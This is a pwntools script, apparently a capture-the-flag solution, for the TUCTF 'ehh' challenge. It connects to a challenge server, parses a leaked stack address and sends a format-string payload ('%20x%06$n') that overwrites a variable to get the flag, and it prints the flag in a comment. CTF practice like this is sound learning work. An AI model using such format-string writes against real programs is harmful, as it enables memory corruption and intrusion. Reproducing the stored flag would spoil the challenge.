"""
TUCTF ehh pwn challenge solution
"""
# Imports
import re, sys, time
from pwn import *
# Set pwntools context to i386
context.update(arch='i386')

def main():
  """
  Runs on program execution.
  """
  # Read challenge binary into pwntools
  elf = ELF('ehh')

  # Connect to the remote challenge
  p = remote('18.222.213.102', 12345)
  
  # Get the stack base address
  base_addr = int(re.search(r'(>Input interesting text here<) (.*)', p.readline()).group(2), 16)

  # Set the val flag to 24
  p.sendline(p32(base_addr) + '%20x%06$n')

  # Get the flag
  print p.interactive() # TUCTF{pr1n7f_15_pr377y_c00l_huh}

  
# Hook
if __name__ == '__main__':
  main()